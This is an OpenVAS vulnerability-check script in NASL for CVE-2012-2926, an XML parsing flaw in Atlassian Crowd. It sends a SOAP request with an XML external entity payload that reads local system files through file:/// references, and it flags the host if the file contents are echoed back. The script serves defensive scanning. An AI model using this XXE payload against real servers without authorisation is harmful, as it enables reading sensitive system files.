###############################################################################
# OpenVAS Vulnerability Test
# $Id: gb_atlassian_crowd_53595.nasl 12 2013-10-27 11:15:33Z jan $
#
# Atlassian Crowd XML Parsing Denial of Service Vulnerability 
#
# Authors:
# Michael Meyer <michael.meyer@greenbone.net>
#
# Copyright:
# Copyright (c) 2012 Greenbone Networks GmbH
#
# This program is free software; you can redistribute it and/or
# modify it under the terms of the GNU General Public License
# as published by the Free Software Foundation; either version 2
# of the License, or (at your option) any later version.
#
# This program is distributed in the hope that it will be useful,
# but WITHOUT ANY WARRANTY; without even the implied warranty of
# MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
# GNU General Public License for more details.
#
# You should have received a copy of the GNU General Public License
# along with this program; if not, write to the Free Software
# Foundation, Inc., 51 Franklin St, Fifth Floor, Boston, MA 02110-1301 USA.
###############################################################################

include("revisions-lib.inc");
tag_summary = "Crowd before 2.0.9, 2.1 before 2.1.2, 2.2 before 2.2.9, 2.3 before 2.3.7, and 2.4
before 2.4.1 do not properly restrict the capabilities of third-party XML parsers,
which allows remote attackers to read arbitrary files or cause a denial of
service (resource consumption) via unspecified vectors.";

tag_solution = "Updates are available. Please see the references for more information.";

if (description)
{
 script_id(103512);
 script_bugtraq_id(53595);
 script_cve_id("CVE-2012-2926");
 script_tag(name:"cvss_base", value:"6.4");
 script_tag(name:"cvss_base_vector", value:"AV:N/AC:L/Au:N/C:P/I:N/A:P");
 script_version ("$Revision: 12 $");

 script_name("Atlassian Crowd XML Parsing Denial of Service Vulnerability");

desc = "
 Summary:
 " + tag_summary + "
 Solution:
 " + tag_solution;
 script_xref(name : "URL" , value : "http://www.securityfocus.com/bid/53595");
 script_xref(name : "URL" , value : "https://jira.atlassian.com/browse/JRA-27719");
 script_xref(name : "URL" , value : "http://www.atlassian.com/software/jira/");
 script_xref(name : "URL" , value : "http://confluence.atlassian.com/display/JIRA/JIRA+Security+Advisory+2012-05-17");

 script_tag(name:"risk_factor", value:"High");
 script_tag(name:"last_modification", value:"$Date: 2013-10-27 12:15:33 +0100 (Sun, 27 Oct 2013) $");
 script_tag(name:"creation_date", value:"2012-07-11 15:40:23 +0200 (Wed, 11 Jul 2012)");
 script_description(desc);
 script_summary("Determine if it is possible to read a local file");
 script_category(ACT_ATTACK);
 script_family("Web application abuses");
 script_copyright("This script is Copyright (C) 2012 Greenbone Networks GmbH");
 script_dependencies("find_service.nasl", "http_version.nasl");
 script_require_ports("Services/www", 8095);
 if (revcomp(a: OPENVAS_VERSION, b: "6.0+beta5") >= 0) {
   script_tag(name : "solution" , value : tag_solution);
   script_tag(name : "summary" , value : tag_summary);
 }
 exit(0);
}

include("http_func.inc");
include("host_details.inc");
include("http_keepalive.inc");
include("misc_func.inc");

port = get_http_port(default:8095);
if(!get_port_state(port))exit(0);

url = '/crowd/services';
req = http_get(item:url, port:port);
buf = http_keepalive_send_recv(port:port, data:req, bodyonly:FALSE);

if("Invalid SOAP request" >!< buf)exit(0);

files = traversal_files(); 
host = get_host_name();

entity =  rand_str(length:8,charset:"abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ");

foreach file (keys(files)) {

  soap = '<!DOCTYPE foo [<!ENTITY ' + entity  + ' SYSTEM "file:///' + files[file]  + '"> ]>
<soapenv:Envelope xmlns:soapenv="http://schemas.xmlsoap.org/soap/envelope/" xmlns:urn="urn:SecurityServer" xmlns:aut="http://authentication.integration.crowd.atlassian.com" xmlns:soap="http://soap.integration.crowd.atlassian.com">
<soapenv:Header/>
<soapenv:Body>
<urn:addAllPrincipals>
<urn:in0>
<!--Optional:-->
<aut:name>?</aut:name>
<!--Optional:-->
<aut:token>?</aut:token>
</urn:in0>
<urn:in1>
<!--Zero or more repetitions:-->
<soap:SOAPPrincipalWithCredential>
<!--Optional:-->
<soap:passwordCredential>
<!--Optional:-->
<aut:credential>?</aut:credential>
<!--Optional:-->
<aut:encryptedCredential>?&' + entity  + ';</aut:encryptedCredential>
</soap:passwordCredential>
<!--Optional:-->
<soap:principal>
<!--Optional:-->
<soap:ID>?</soap:ID>
<!--Optional:-->
<soap:active>?</soap:active>
<!--Optional:-->
<soap:attributes>
<!--Zero or more repetitions:-->
<soap:SOAPAttribute>
<!--Optional:-->
<soap:name>?</soap:name>
<!--Optional:-->
<soap:values>
<!--Zero or more repetitions:-->
<urn:string>?</urn:string>
</soap:values>
</soap:SOAPAttribute>
</soap:attributes>';

  len = strlen(soap);  

  req = string("POST ",url," HTTP/1.1\r\n",
               "Host: ", host,"\r\n",
               "User-Agent: Mozilla/4.0 (compatible; MSIE 6.0; OpenVAS 5)\r\n",
               "SOAPAction: ",'""',"\r\n",
               "Content-Type: text/xml; charset=UTF-8\r\n",
               "Content-Length: ", len,"\r\n",
               "\r\n",
               soap);
 
  result = http_keepalive_send_recv(port:port, data:req, bodyonly:FALSE);
  
  if(egrep(pattern:file, string:result)) { 
    security_hole(port:port);
    exit(0);
  }  

}  

exit(0);
